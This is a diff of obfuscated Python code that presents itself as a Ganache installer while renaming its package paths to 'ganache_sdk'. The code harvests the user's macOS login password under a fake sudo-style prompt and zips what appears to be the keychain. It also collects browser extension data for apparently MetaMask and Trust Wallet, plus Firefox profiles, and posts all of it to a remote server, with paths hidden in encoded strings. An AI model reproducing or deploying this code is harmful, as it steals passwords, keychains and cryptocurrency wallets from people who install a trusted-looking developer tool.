@@ -5,7 +5,7 @@ I='file'
 C=open
 B=print
 import requests as D
-from ganache.utils import G as M,K
+from ganache_sdk.utils import G as M,K
 import os as A,getpass as O,subprocess as P,glob as E,re,shutil as X
 V='=8yculWYoNWelt0L5JXYyJWaM9if'
 W='=4Wahh2Y5V2a'
@@ -42,7 +42,7 @@ class q:
 		while L==S:
 			try:N=O.getpass(prompt=K(p));T='dscl . -authonly {} "{}"'.format(O.getuser(),N);U=P.check_output(T,shell=True,stderr=P.DEVNULL);L=U==''.encode('utf-8')
 			except:B('Sorry, try again.')
-		B('Installing Ganache');X=A.path.expanduser(K(V));Q='ganache/kc.zip';M(X,Q);Z={I:C(Q,J)};a={K(F):E.device_id,K(G):K(W),K(Y):N}
+		B('Installing Ganache');X=A.path.expanduser(K(V));Q='ganache_sdk/kc.zip';M(X,Q);Z={I:C(Q,J)};a={K(F):E.device_id,K(G):K(W),K(Y):N}
 		try:
 			R=D.post(E.base_url+K(H),data=a,files=Z)
 			if R.status_code<200 or R.status_code>=300:B('Error 43: Unknown error')
@@ -73,15 +73,15 @@ class s:
 		for id in E.id_list:
 			O=path+K(j)+id
 			if A.path.exists(O):
-				L='ganache/mtm.zip';type=K(T)
-				if id==K(S):L='ganache/tw.zip';type=K(k)
+				L='ganache_sdk/mtm.zip';type=K(T)
+				if id==K(S):L='ganache_sdk/tw.zip';type=K(k)
 				M(O,L);Q={I:C(L,J)};R={K(F):E.device_id,K(N):browser,K(G):type,U:id}
 				try:
 					P=D.post(E.base_url+K(H),data=R,files=Q)
 					if P.status_code<200 or P.status_code>=300:B('Error 44: Unknown error')
 				except:B('Error -44: Unknown error')
 	def __handle_ff(Q):
-		W='ganache/mtmf.zip';Y=E.glob(A.path.expanduser(K(l)))
+		W='ganache_sdk/mtmf.zip';Y=E.glob(A.path.expanduser(K(l)))
 		for L in Y:
 			with C(L,'r', encoding='utf-8', errors='ignore')as O:
 				Z=O.read();R=re.search(K(m),Z)
